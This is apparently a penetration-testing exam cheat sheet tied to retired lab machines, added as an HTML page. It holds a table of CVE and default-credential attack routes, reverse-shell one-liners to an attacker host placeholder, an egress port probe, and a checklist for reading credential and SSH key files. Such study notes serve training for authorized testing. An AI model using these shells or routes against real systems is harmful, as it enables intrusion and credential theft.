+<td>CVE-2024-9796 unauth SQLi via <code>f</code> param (<code>extractvalue()</code>)</td>
+<td>Workaholic</td>
+</tr>
+<tr>
+<td><strong>Mage AI &lt; 0.9.76</strong></td>
+<td><code>REQUIRE_USER_AUTHENTICATION=false</code> default -&gt; Files + Terminal UI</td>
+<td>Zab</td>
+</tr>
+<tr>
+<td><strong>Zenphoto &lt;= 1.4.1.4</strong></td>
+<td>EDB 18083 unauth ajaxfilemanager -&gt; <code>Cmd:</code> header</td>
+<td>zenphoto</td>
+</tr>
+<tr>
+<td><strong>Gitea 1.7.x open registration</strong></td>
+<td>First user = admin -&gt; repo Settings -&gt; Git Hooks post-receive</td>
+<td>Roquefort</td>
+</tr>
+<tr>
+<td><strong>PostgreSQL default <code>postgres:postgres</code></strong></td>
+<td><code>COPY FROM PROGRAM</code> — three SQL statements</td>
+<td>Nibbles</td>
+</tr>
+<tr>
+<td><strong>Redis 4.x – 5.x unauth</strong></td>
+<td><code>MODULE LOAD</code> <code>.so</code> via anon FTP write OR SLAVEOF replication</td>
+<td>Wombo, Sybaris</td>
+</tr>
+<tr>
+<td><strong>Cassandra Web 0.5.0</strong></td>
+<td>CVE-2020-36939 unauth arbitrary file read via <code>%2f</code>-encoded traversal</td>
+<td>Clue</td>
+</tr>
+<tr>
+<td><strong>FreeSWITCH mod_event_socket</strong></td>
+<td><code>api system &lt;cmd&gt;</code> after auth with password from <code>/proc/self/cmdline</code></td>
+<td>Clue</td>
+</tr>
+<tr>
+<td><strong>OpenSMTPD &lt;= 6.6.1</strong></td>
+<td>CVE-2020-7247 EDB 47984 unauth root — Python payload, double-escape quotes</td>
+<td>Bratarina</td>
+</tr>
+<tr>
+<td><strong>PHP-SPX</strong></td>
+<td><code>phpinfo.php</code> leaks <code>spx.http_key</code> -&gt; <code>SPX_UI_URI</code> path traversal</td>
+<td>SPX</td>
+</tr>
+<tr>
+<td><strong>GlassFish 4.1 unauth admin</strong></td>
+<td>CVE-2017-1000028 <code>%c0%af..</code> overlong UTF-8 LFI</td>
+<td>Fish</td>
+</tr>
+<tr>
+<td><strong>Argus Surveillance DVR 4.0</strong></td>
+<td>CVE-2018-15745 unauth LFI via <code>WEBACCOUNT.CGI?RESULTPAGE=..</code></td>
+<td>DVR4</td>
+</tr>
+<tr>
+<td><strong>Sonatype Nexus 3.21.0-05</strong></td>
+<td>CVE-2020-10199 — <code>nexus:nexus</code> fallback + Go-group EL injection (EDB 49385)</td>
+<td>Billyboss</td>
+</tr>
+<tr>
+<td><strong>BarracudaDrive 6.5</strong></td>
+<td>Setup wizard left unfinished -&gt; <code>Config-Wizard/wizard/SetAdmin.lsp</code> + <code>/fs/C/</code> as SYSTEM</td>
+<td>Medjed</td>
+</tr>
+<tr>
+<td><strong>Rails dev-mode CVE-2019-5420</strong></td>
+<td>DoubleTap — <code>MD5("&lt;AppName&gt;::Application")</code> derives secret; activesupport 5.2.4.1 pin</td>
+<td>Medjed</td>
+</tr>
+<tr>
+<td><strong>SmarterMail 100.0.6919 (&lt; 6985)</strong></td>
+<td>CVE-2019-7214 .NET Remoting on TCP 17001; ysoserial.net + EDB 49216</td>
+<td>Algernon</td>
+</tr>
+<tr>
+<td><strong>rConfig 3.9.4</strong></td>
+<td>CVE-2020-10220 unauth SQLi (EDB 48208) + CVE-2020-10879 auth RCE (EDB 48241)</td>
+<td>Quackerjack</td>
+</tr>
+<tr>
+<td><strong>ZoneMinder 1.29</strong></td>
+<td>EDB 41239 unauth stacked SQLi via <code>limit</code> param + INTO OUTFILE + PwnKit</td>
+<td>Pebbles</td>
+</tr>
+<tr>
+<td><strong>Subrion CMS 4.2.1</strong></td>
+<td>CVE-2018-19422 <code>admin:admin</code> + <code>.phar</code> upload</td>
+<td>Exfiltrated</td>
+</tr>
+<tr>
+<td><strong>OpenEMR 5.0.1</strong></td>
+<td>Path A — <code>manage_site_files.php</code> feature abuse; Path B — CVE-2018-17179 (EDB 45161)</td>
+<td>Apex</td>
+</tr>
+<tr>
+<td><strong>BoxBilling &lt;= 4.22.1.5</strong></td>
+<td>CVE-2022-3552 auth <code>save_file</code> with any valid <code>order_id</code></td>
+<td>BullyBox</td>
+</tr>
+<tr>
+<td><strong>Monstra CMS 3.0.4</strong></td>
+<td>CVE-2018-6383 theme-template RCE via admin</td>
+<td>Monster</td>
+</tr>
+<tr>
+<td><strong>Responsive Filemanager 9.13.4</strong></td>
+<td>CVE-2019-11393 LFI with valid <code>PHPSESSID</code> (EDB 49359)</td>
+<td>Apex</td>
+</tr>
+<tr>
+<td><strong>Nextcloud <code>admin:admin</code></strong></td>
+<td>WebDAV: <code>curl -u admin:admin http://&lt;IP&gt;/cloud/remote.php/dav/files/admin/&lt;file&gt;</code></td>
+<td>Hawat</td>
+</tr>
+<tr>
+<td><strong>Spring Boot <code>/api/user/</code></strong></td>
+<td>Sometimes leaks entire user table with cleartext passwords</td>
+<td>Hawat</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="egress-payload-survival">Egress + Payload Survival</h2>
+<p><strong>Iterate outbound ports — bash test:</strong></p>
+<pre><code class="language-bash">for p in 80 443 4444 21 53 3000 8000 8080; do
+  timeout 3 bash -c &quot;echo &gt; /dev/tcp/&lt;LHOST&gt;/$p&quot; 2&gt;/dev/null &amp;&amp; echo &quot;$p OPEN&quot;
+done
+</code></pre>
+<p>Common winners on PG: <strong>80, 443, 21, 53</strong> (Roquefort needed port 21 — FTP whitelist).</p>
+<p><strong>Payloads that beat quirky exec contexts:</strong></p>
+<ul>
+<li><code>cmd/unix/reverse_bash</code> beats an ELF through <code>Runtime.exec()</code> (Fired)</li>
+<li>Python payload beats <code>bash /dev/tcp</code> through OpenSMTPD's MDA shell (Bratarina)</li>
+<li><code>setsid</code> detaches from PHP's <code>max_execution_time</code> (SpiderSociety):</li>
+</ul>
+<p><code>bash
+  setsid bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1" &amp;</code>
+* <code>socat</code> for stateless webshells (Exfiltrated):</p>
+<p><code>bash
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:&lt;LPORT&gt;</code></p>
+<p><strong>Confirm exploit vs payload with ICMP canary:</strong></p>
+<pre><code class="language-bash"># Trigger a `ping -c 3 &lt;LHOST&gt;` via the exploit; on attacker:
+sudo tcpdump -i tun0 icmp -n
+</code></pre>
+<hr />
+<h2 id="after-foothold-first-30-seconds-linux">After Foothold — First 30 Seconds (Linux)</h2>
+<p><strong>Before you upgrade the TTY</strong> (Astronaut hides SUID after <code>pty.spawn</code>):</p>
+<pre><code class="language-bash">id                                              # groups: disk / docker / lxd / adm / mlocate / staff
+sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null           # SUID binaries
+getcap -r / 2&gt;/dev/null | grep -E 'cap_setuid|cap_setgid|cap_dac_read_search|cap_sys_admin'
+cat /etc/crontab
+</code></pre>
+<p><strong>Then the standard PTY upgrade:</strong></p>
+<pre><code class="language-bash">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+# Ctrl+Z on attacker
+stty raw -echo; fg
+# Enter twice
+export TERM=xterm-256color
+</code></pre>
+<hr />
+<h2 id="exam-day-web-checklist">EXAM-Day Web Checklist</h2>
+<p><strong>Broad recon (all boxes):</strong></p>
+<ul>
+<li>[ ] Full TCP scan first (<code>-p-</code>), then <code>-sC -sV</code> on open</li>
+<li>[ ] For every HTTP port: <code>curl -sI</code>, <code>whatweb</code>, <code>Location:</code> header, view source</li>
+<li>[ ] Note non-standard ports as intentional signals</li>
+<li>[ ] Add every discovered vhost to <code>/etc/hosts</code></li>
+</ul>
+<p><strong>Per-web-app:</strong></p>
+<ul>
+<li>[ ] Version + product ID -&gt; CVE search (<code>searchsploit &lt;product&gt;</code>, Google <code>&lt;product&gt; &lt;version&gt; exploit</code>)</li>
+<li>[ ] Default creds table above BEFORE any CVE</li>
+<li>[ ] <code>/.git/HEAD</code>, <code>/.env</code>, <code>/robots.txt</code>, <code>/admin</code>, <code>/install</code>, <code>/setup</code>, <code>/wizard</code>, <code>/phpinfo.php</code>, <code>/backup</code>, <code>/api/v1/version</code></li>
+<li>[ ] Dirbuster with <code>--exclude-length</code> for the WP-catchall trap</li>
+<li>[ ] Look for open registration + first-user-admin (Gitea-shaped apps)</li>
+<li>[ ] Read every <code>&lt;meta name="generator"&gt;</code> and every error page</li>
+</ul>
+<p><strong>When you have a file read:</strong></p>
+<ul>
+<li>[ ] <code>/etc/passwd</code> (user list)</li>
+<li>[ ] <code>/proc/self/cwd/*.py</code>, <code>/proc/self/cmdline</code> (source + CLI creds), <code>/proc/self/environ</code></li>
+<li>[ ] App-specific configs: <code>wp-config.php</code>, <code>.env</code>, <code>zabbix.conf.php</code>, <code>grafana.db</code>, <code>openfire.script</code>, <code>.htusers.php</code></li>
+<li>[ ] <code>/.ssh/id_rsa</code> for any user in <code>/etc/passwd</code></li>
+</ul>
+<p><strong>When you have a shell:</strong></p>
+<ul>
+<li>[ ] Grab local flag</li>
+<li>[ ] Password reuse: try every found cred as <code>su</code> / <code>ssh</code> for every user in <code>/etc/passwd</code></li>
+<li>[ ] <code>id</code>, <code>sudo -l</code>, SUID find, <code>getcap</code> <strong>before</strong> PTY upgrade</li>
+<li>[ ] <code>pspy64</code> for at least 60s</li>
+</ul>
+<p><strong>Under exam time pressure:</strong></p>
+<ul>
+<li>[ ] Timebox each rabbit hole at 30 min</li>
+<li>[ ] Rotate egress ports on silent callbacks</li>
+<li>[ ] Metasploit exploit/aux modules = one target only</li>
+<li>[ ] SQLMap = banned — use manual <code>extractvalue()</code> (Workaholic pattern)</li>
+</ul>
+  <p class="disclaimer">// For authorized engagements, lab environments, and exam prep only. Box names reference retired HTB / PG Practice targets used for study. Replace all placeholders with your own scoped values.</p>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — web · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');a.scrollIntoView({block:'nearest',inline:'center'});}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
